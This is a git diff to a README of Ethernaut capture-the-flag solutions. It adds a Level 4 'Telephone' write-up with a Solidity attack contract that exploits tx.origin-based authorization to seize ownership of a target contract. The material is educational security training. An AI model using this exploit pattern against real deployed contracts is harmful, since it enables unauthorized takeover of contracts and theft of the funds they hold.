@@ -10,11 +10,11 @@ Brief solutions for OpenZeppelin's Ethernaut CTF. Writeups pending.
 [Level 1: Fallback](#Fallback)  
 [Level 2: Fallout](#Fallout)  
 [Level 3: Coin Flip](#CoinFlip)
+[Level 4: Telephone](#Telephone)
 
 <!---
 
 **Pending**
-[Level 4: Telephone](#Telephone)
 [Level 5: Token](#Token)
 [Level 6: Delegation](#Delegation)
 [Level 7: Force](#Force)
@@ -43,6 +43,7 @@ Brief solutions for OpenZeppelin's Ethernaut CTF. Writeups pending.
 ## Requirements
 
 - [Metamask](https://metamask.io/)
+- [Remix IDE](https://remix.ethereum.org)
 
 ## <a name='HelloEthernaut'></a> 0. Hello Ethernaut
 
@@ -163,3 +164,33 @@ Finally, we will pass the side value into the original contract, ensuring our gu
 targetContract.flip(side);
 ```
 We patiently call `flipSolve()` 10 times until we have guessed correctly 10 times and solve the level.
+
+
+## <a name='Telephone'></a> 4. Telephone
+
+> Claim ownership of the contract.
+
+The contract allows for a straightforward exploit given the difference between `msg.sender` and `tx.origin`. By creating a contract that serves an as intermediary to call `changeOwner()`, we can claim ownership of the target contract.
+
+```solidity
+// Import the target contract
+import './Telephone.sol';
+
+//Create attacking contract
+contract HotlineBling {
+
+  // Setup target contract
+  Telephone public EthernautHotline;
+
+  constructor(address _targetCellPhone) public {
+
+    // Setup deployed instance as attack target
+    EthernautHotline = Telephone(_targetCellPhone);
+  }
+    // Execute the attack
+    function callTheVictim() public {
+        EthernautHotline.changeOwner(msg.sender);
+    }
+
+}
+```
